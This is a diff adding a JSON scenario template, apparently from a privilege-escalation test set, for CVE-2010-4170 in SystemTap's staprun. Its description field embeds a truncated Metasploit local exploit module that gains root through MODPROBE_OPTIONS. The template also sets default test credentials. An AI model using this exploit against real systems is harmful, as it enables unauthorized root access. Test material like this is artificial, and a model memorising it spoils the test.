@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_46730",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: SystemTap 1.3 - MODPROBE_OPTIONS Privilege Escalation (Metasploit) (CVE-2010-4170)\n\nExploit source code (46730.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SystemTap MODPROBE_OPTIONS Privilege Escalation',\n      'Description'    => %q{\n        This module attempts to gain root privileges by exploiting a\n        vulnerability in the `staprun` executable included with SystemTap\n        version 1.3.\n\n        The `staprun` executable does not clear environment variables prior to\n        executing `modprobe`, allowing an arbitrary configuration file to be\n        specified in the `MODPROBE_OPTIONS` environment variable, resulting\n        in arbitrary command execution with root privileges.\n\n        This module has been tested successfully on:\n\n        systemtap 1.2-1.fc13-i686 on Fedora 13 (i686); and\n        systemtap 1.1-3.el5 on RHEL 5.5 (x64).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Tavis Ormandy', # Discovery and exploit\n          'bcoles'         # Metasploit\n        ],\n      'DisclosureDate' => '2010-11-17',\n      'References'     =>\n        [\n          ['BID', '44914'],\n          ['CVE', '2010-4170'],\n          ['EDB', '15620'],\n          ['URL', 'https://securitytracker.com/id?1024754'],\n          ['URL', 'https://access.redhat.com/security/cve/cve-2010-4170'],\n          ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=653604'],\n          ['URL', 'https://lists.fedoraproject.org/pipermail/package-announce/2010-November/051115.html'],\n          ['URL', 'https://bugs.launchpad.net/bugs/677226'],\n          ['URL', 'https://www.debian.org/security/2011/dsa-2348']\n        ],\n      'Platform'       => ['linux'],\n      'Arch'           =>\n        [\n          ARCH_X86,\n          ARCH_X64,\n          ARCH_ARMLE,\n          ARCH_AARCH64,\n          ARCH_PPC,\n          ARCH_MIPSLE,\n          ARCH_MIPSBE\n        ],\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'Targets'        => [['Auto', {}]],\n      'DefaultTarget'  => 0))\n    register_options [\n      OptString.new('STAPRUN_PATH', [true, 'Path to staprun executable', '/usr/bin/staprun'])\n    ]\n    register_advanced_options [\n      OptBool.new('ForceExploit', [false, 'Override check result', false]),\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def staprun_path\n    datastore['STAPRUN_PATH']\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    chmod \n```",
+  "cve": "CVE-2010-4170",
+  "exploitdb_id": "46730",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_46730",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
